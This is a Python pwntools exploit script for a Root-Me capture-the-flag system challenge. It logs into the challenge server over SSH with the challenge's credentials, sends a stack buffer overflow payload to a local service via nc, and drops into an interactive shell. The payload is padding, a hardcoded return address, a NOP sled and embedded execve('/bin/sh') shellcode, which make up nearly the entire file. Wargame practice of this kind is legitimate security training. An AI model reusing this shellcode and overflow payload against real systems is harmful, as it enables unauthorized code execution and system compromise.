"""
Example showing how to use the ssh class.
"""

from pwn import *

shell = ssh(host='challenge03.root-me.org',user='app-systeme-ch65',password='app-systeme-ch65', port=2223)


# Show full tube syntax
# tube = shell.run('./run.sh')

# offset = 24
# fill = "A"*offset
# nop = "\x90"*36
# payload = fill+nop+shellcode


# sh_addr = "\xc0\xf6\xff\x76"
# sh_addr_b = "\x76\xff\xf6\xc0"

shellcode_addr = 0x7ffffe20
# shellcode_addr = 0x7ffffc80 + 24
shellcode = ("\xff\xff\x10\x04\xab\x0f\x02\x24"
"\x55\xf0\x46\x20\x66\x06\xff\x23"
"\xc2\xf9\xec\x23\x66\x06\xbd\x23"
"\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
"\x9a\xf9\xbd\x23\x21\x20\x80\x01"
"\x21\x28\xa0\x03\xcc\xcd\x44\x03"
"/bin/sh\x00")

payload = "A"*0x14
payload += str(p32(shellcode_addr))
payload += "\x90"*12
payload += shellcode 



ip = "127.0.0.1"
port = 56565

tube = shell.run("nc {} {}".format(ip, port)) 
print(payload)
tube.send(bytes(payload, 'utf-8'))
print(tube.recvall())
# tube.send("whoami")
# print(tube.recvall())
shell.interactive()
print('Done!')

# # Show off the interactive shell